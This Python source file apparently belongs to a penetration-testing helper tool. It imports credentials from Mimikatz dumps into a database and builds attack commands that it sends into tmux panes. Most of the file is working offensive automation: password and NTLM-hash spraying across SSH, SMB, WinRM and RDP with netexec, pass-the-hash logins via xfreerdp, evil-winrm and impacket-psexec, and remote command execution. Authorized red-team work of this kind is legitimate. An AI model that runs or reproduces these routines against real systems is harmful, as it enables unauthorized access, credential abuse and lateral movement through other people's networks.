"""
Main file for all commands prefixed with "creds"
"""
import hh.tmux
from models import Credentials, Host
from app import db
import hh.utils
from colorama import Fore
import os

import hh.mimi_parser
import pyperclip
from typing import List
import time
import log
import questionary


def creds(filter=None):
    """
    List all credentials from the database
    """
    if filter:
        log.debug(f'Using filter on creds: {filter}')

        credentials = db.session.query(Credentials).filter(
            (Credentials.username.icontains(filter) | Credentials.domain.icontains(filter))).all()

    else:
        credentials = Credentials.query.filter(Credentials.username.isnot(None))
    hh.utils.print_creds_table(credentials)


def creds_add(interactive=False, file=False, filepath=None, clipboard=False, mode_selection=True):
    """
    Add credentials
    """

    if mode_selection:
        mode = questionary.select('Mode',
                                  choices=['interactive', 'file', 'clipboard'],
                                  use_search_filter=True,
                                  use_jk_keys=False).ask()

        if mode == 'interactive':
            interactive = True
        elif mode == 'file':
            file = True
        elif mode == 'clipboard':
            clipboard = True

        if not mode:
            return

    if interactive:
        print('interactive')
        current = {'Source': 'Interactive'}
        current['Domain'] = input('Domain: ') or None
        current['Username'] = input('Username: ') or None
        current['Password'] = input('Password: ') or None
        current['NTLM'] = input('ntlm: ') or None

        # maybe allow entries with empty user?
        hh.mimi_parser.insert_into_db(current)
        return

    # read file
    if file:
        if not filepath:
            filepath = input('Path: ')
        with open(filepath) as f:
            data = f.read()

    if clipboard:
        data = pyperclip.paste()

    previous_oldest_id = hh.utils.get_current_last_cred_id()

    # check for any errors
    if 'ERROR' in data:
        print(Fore.RED + """[!] ###################################################
[!] #     ERROR FOUND IN MIMIKATZ LOG INVESTIGATE!    #
[!] ###################################################""")

    log.debug('Parsing sekurlsa::logonPasswords')
    hh.mimi_parser.process_logon_passwords(data)

    log.debug('Parsing lsadump::sam')
    hh.mimi_parser.process_lsadump(data)

    log.debug('Parsing lsadump::secrets')
    hh.mimi_parser.process_secrets(data)

    current_oldest_id = hh.utils.get_current_last_cred_id()
    db.session.flush()
    creds = Credentials.query.filter(Credentials.id.between(previous_oldest_id + 1, current_oldest_id)).all()

    log.success(f'Added {len(creds)} credentials!')
    hh.utils.print_creds_table(creds)


def creds_edit():
    credentials = Credentials.query.filter(Credentials.username.isnot(None)).all()
    if len(credentials) == 0:
        log.debug('No credentials found.')
        return

    hh.utils.print_creds_table(credentials)
    creds = hh.utils.cli_select_credentials('Select an entry to edit', credentials)
    username = hh.utils.questionary_text('Username', creds.username)
    domain = hh.utils.questionary_text('Domain', creds.domain)
    password = hh.utils.questionary_text('Password', creds.password)
    ntlm = hh.utils.questionary_text('NTLM', creds.ntlm)
    source = hh.utils.questionary_text('Source', creds.source)

    # set the values back to None if they are empty

    creds.username = username
    creds.password = password
    creds.domain = domain
    creds.ntlm = ntlm
    creds.source = source
    db.session.commit()
    log.success('Entry updated!')


def creds_delete():
    credentials = Credentials.query.filter(Credentials.username.isnot(None)).all()
    if len(credentials) == 0:
        log.debug('No credentials found.')
        return

    hh.utils.print_creds_table(credentials)
    creds = hh.utils.cli_select_credentials('Select an entry to delete', credentials)
    answer = questionary.confirm('Are you sure?').ask()
    if answer:
        db.session.delete(creds)
        db.session.commit()
        log.info('Deleted the credentials')


def creds_use():
    credentials = Credentials.query.filter(Credentials.username.isnot(None)).all()
    if len(credentials) == 0:
        log.debug('No credentials found.')
        return

    hh.utils.print_creds_table(credentials)
    protocol = questionary.select('Protocol',
                                  choices=['ssh', 'smb', 'mssql', 'rdp', 'winrm'],
                                  use_search_filter=True,
                                  use_jk_keys=False).ask()

    if not protocol:
        return

    creds = hh.utils.cli_select_credentials('Select an entry to use', credentials)
    if not creds:
        return

    hosts = db.session.query(Host).filter(Host.address.isnot(None)).all()

    if len(hosts) == 0:
        log.critical('No host found!')
        return
    host = hh.utils.cli_select_host('Select a target', hosts)
    if not host:
        return

    # rdp pth
    # prefer password over ntlm
    if protocol == 'rdp':
        rdp_single(creds, host)
    elif protocol == 'winrm':
        winrm_single(creds, host)
    elif protocol == 'smb':
        smb_single(creds, host)
    elif protocol == 'ssh':
        ssh_single(creds, host)


def creds_spray_username_allproto():
    """
    This will spray the usrname for all protocols
    """

    credentials = Credentials.query.filter(Credentials.username.isnot(None)).all()
    if len(credentials) == 0:
        log.debug('No credentials found.')
        return

    hh.utils.print_creds_table(credentials)

    target_service_map = {'ssh': 22, 'smb': 445, 'mssql': 1443, 'rdp': 3389, 'winrm': 5985}

    creds = hh.utils.cli_select_credentials('Select an entry to use', credentials)

    # stümperhaft, just all hosts lol
    hosts = db.session.query(Host).filter(Host.address.isnot(None)).all()
    proto_map = {'ssh': ssh_spray, 'smb': smb_spray, 'rdp': rdp_spray, 'winrm': winrm_spray}

    for proto, func in proto_map.items():
        func(creds, credentials, hosts, tmux_window_name=f'hh-spray-{creds.username}')


def creds_spray_username():
    """
    Selection for a user, the user will be sprayed with all valid passwords over all valid targets
    """

    credentials = Credentials.query.filter(Credentials.username.isnot(None)).all()
    if len(credentials) == 0:
        log.debug('No credentials found.')
        return

    hh.utils.print_creds_table(credentials)
    protocol = questionary.select('Protocol',
                                  choices=['ssh', 'smb', 'mssql', 'rdp', 'winrm'],
                                  use_search_filter=True,
                                  use_jk_keys=False).ask()

    if not protocol:
        return

    target_service_map = {'ssh': 22, 'smb': 445, 'mssql': 1443, 'rdp': 3389, 'winrm': 5985}
    target_service = target_service_map[protocol]

    creds = hh.utils.cli_select_credentials('Select an entry to use', credentials)

    # generate list of targets based on port
    hosts = db.session.query(Host).filter(Host.address.isnot(None)).all()
    targets = []
    for host in hosts:
        if target_service in host.service_targets:
            targets.append(host)

    proto_map = {'ssh': ssh_spray, 'smb': smb_spray, 'mssql': None, 'rdp': rdp_spray, 'winrm': winrm_spray}
    func = proto_map[protocol]
    if func:
        func(creds, credentials, targets)
    else:
        log.critical('Not yet implemented')


def ssh_spray(user: Credentials, credentials: List[Credentials], hosts: List[Host], tmux_window_name='hh'):
    """
    Sprays the selected user with the domain to all targets
    """
    NXC_SPRAY_DOMAIN_PASSWORD = "netexec ssh {targets} -u {username} -p '{password}'"

    if not user.password and not user.domain:
        log.debug('User is missing domain or password to spray.')
        return

    # user format
    user_domain = f'{user.username}@{user.domain}'

    # gen targets
    targets_file = os.path.join(os.getcwd(), 'targets-spray-ssh.txt')
    with open(targets_file, 'w') as f:
        f.write('\n'.join([host.address for host in hosts if 22 in host.service_targets]))

    command = NXC_SPRAY_DOMAIN_PASSWORD.format(targets=targets_file, username=user_domain, password=user.password)

    pane = hh.tmux.get_hh_pane(select_window=True, tmux_window_name=tmux_window_name)
    hh.tmux.pane_send_keys(pane, command)


def smb_spray(user: Credentials, credentials: List[Credentials], hosts: List[Host], tmux_window_name='hh'):
    """
    Sprays the selected user with the domain to all targets
    """

    NXC_SPRAY_DOMAIN_PASSWORD = "netexec smb {targets} -u {username} -p '{password}' -d {domain}"
    NXC_SPRAY_DOMAIN_NTLM = "netexec smb {targets} -u {username} -H {hash} -d {domain}"

    # gen targets
    targets_file = os.path.join(os.getcwd(), 'targets-spray-smb.txt')
    with open(targets_file, 'w') as f:
        f.write('\n'.join([host.address for host in hosts if 445 in host.service_targets]))

    command = None
    if user.password:
        command = NXC_SPRAY_DOMAIN_PASSWORD.format(targets=targets_file,
                                                   domain=user.domain,
                                                   username=user.username,
                                                   password=user.password)
    else:
        command = NXC_SPRAY_DOMAIN_NTLM.format(targets=targets_file,
                                               domain=user.domain,
                                               username=user.username,
                                               hash=user.ntlm)
    pane = hh.tmux.get_hh_pane(select_window=True, tmux_window_name=tmux_window_name)
    hh.tmux.pane_send_keys(pane, command)


def winrm_spray(user: Credentials, credentials: List[Credentials], hosts: List[Host], tmux_window_name='hh'):
    """
    Get all NT hashes and spray them over all targets for the selected user
    """
    NXC_SPRAY_LOCAL_AUTH = "netexec winrm {targets} -u {username} -H {hash} --local-auth"

    # # list of all hashes
    # hash_file = os.path.join(os.getcwd(), 'password-spray.txt')
    # with open(hash_file, 'w') as f:
    #     f.write('\n'.join([creds.ntlm for creds in credentials if creds.ntlm]))

    # gen targets
    targets_file = os.path.join(os.getcwd(), 'targets-spray-winrm.txt')
    with open(targets_file, 'w') as f:
        f.write('\n'.join([host.address for host in hosts if 5985 in host.service_targets]))

    spray_local = NXC_SPRAY_LOCAL_AUTH.format(
        targets=targets_file,
        domain=user.domain,
        username=user.username,
        hash=user.ntlm,
    )
    pane = hh.tmux.get_hh_pane(select_window=True, tmux_window_name=tmux_window_name)
    hh.tmux.pane_send_keys(pane, spray_local)


def rdp_spray(user: Credentials, credentials: List[Credentials], hosts: List[Host], tmux_window_name='hh'):
    """
    Will spray credentials to all targets

    `user`: Username and Domain to use
    `credentials`: Will be used to generate a list of passwords
    `hosts`: Will be used to generate a list of targets

    We can't spray ntlm hash because registry key is not set
    """
    NXC_SPRAY_DOMAIN = "netexec rdp {targets} --continue-on-success -d {domain} -u {username} -p {password_file}"
    NXC_SPRAY_LOCAL_AUTH = "netexec rdp {targets} --continue-on-success --local-auth -u {username} -p {password_file}"

    # gen list of password
    password_file = os.path.join(os.getcwd(), 'password-spray-rdp.txt')
    with open(password_file, 'w') as f:
        f.write('\n'.join([creds.password for creds in credentials if creds.password]))

    # gen targets
    targets_file = os.path.join(os.getcwd(), 'targets-spray-rdp.txt')
    with open(targets_file, 'w') as f:
        f.write('\n'.join([host.address for host in hosts]))

    spray_domain = NXC_SPRAY_DOMAIN.format(
        targets=targets_file,
        domain=user.domain,
        username=user.username,
        password_file=password_file,
    )
    pane = hh.tmux.get_hh_pane(select_window=True, tmux_window_name=tmux_window_name)
    hh.tmux.pane_send_keys(pane, spray_domain)

    # wait 5 seconds for nxc to start up
    time.sleep(5)
    spray_local = NXC_SPRAY_LOCAL_AUTH.format(
        targets=targets_file,
        username=user.username,
        password_file=password_file,
    )
    pane = hh.tmux.get_hh_pane(tmux_window_name=tmux_window_name)
    hh.tmux.pane_send_keys(pane, spray_local)


def rdp_single(creds: Credentials, host: Host):
    """Will use creds and try to login to RDP to the target host."""

    RDP_PASSWORD = "xfreerdp /cert:ignore /dynamic-resolution /drive:/home/kali/Documents /u:{user} /p:'{password}'  /v:{address}"
    RDP_PTH = 'xfreerdp /cert:ignore /dynamic-resolution /drive:/home/kali/Documents /u:{user} /pth:{hash}  /v:{address}'
    command = None
    if creds.password:
        command = RDP_PASSWORD.format(user=creds.username, password=creds.password, address=host.address)
    elif creds.ntlm:
        command = RDP_PTH.format(user=creds.username, hash=creds.ntlm, address=host.address)

    if not command:
        log.debug('No password or ntlm hash found')
        return

    pane = hh.tmux.get_hh_pane()
    hh.tmux.pane_send_keys(pane, command)


def winrm_single(creds: Credentials, host: Host):
    """Will use creds and try to login to winrm to the target host."""

    WINRM_PASSWORD = "evil-winrm -i {address} -u {user} -p '{password}'"
    WINRM_PTH = "evil-winrm -i {address} -u {user} -H {hash}"

    command = None
    if creds.password:
        command = WINRM_PASSWORD.format(user=creds.username, password=creds.password, address=host.address)
    elif creds.ntlm:
        command = WINRM_PTH.format(user=creds.username, hash=creds.ntlm, address=host.address)

    if not command:
        log.debug('No password or ntlm hash found')
        return

    pane = hh.tmux.get_hh_pane(select_window=True)
    hh.tmux.pane_send_keys(pane, command)


def ssh_single(creds: Credentials, host: Host):
    SSH_SINGLE = "ssh -l {username} {address}"
    username = f'{creds.username}@{creds.domain}'

    command = SSH_SINGLE.format(username=username, address=host.address)
    pane = hh.tmux.get_hh_pane(select_window=True)
    hh.tmux.pane_send_keys(pane, command)


def smb_single(creds: Credentials, host: Host):
    """Will use creds and try to login via smb to the target host"""

    SMB_PASSWORD = "netexec smb {address} -u {user} -p '{password}' -X whoami"
    NXC_PTH = "netexec smb {address} -u {user} -H {hash} -X whoami"

    # maybe I need one with the domain?
    IMPACKET_PASSWORD = "impacket-psexec -target-ip {address} {domain}/{user}:'{password}'@{address}"
    IMPACKET_PTH = "impacket-psexec -hashes :{hash} -target-ip {address} {domain}/{user}@{address}"

    command = None
    if creds.password:
        command = SMB_PASSWORD.format(
            address=host.address,
            domain=creds.domain,
            user=creds.username,
            password=creds.password,
        )
    elif creds.ntlm:
        command = IMPACKET_PTH.format(
            hash=creds.ntlm,
            address=host.address,
            domain=creds.domain,
            user=creds.username,
        )

    if not command:
        log.debug('No password or ntlm hash found')
        return

    pane = hh.tmux.get_hh_pane(select_window=True)
    hh.tmux.pane_send_keys(pane, command)
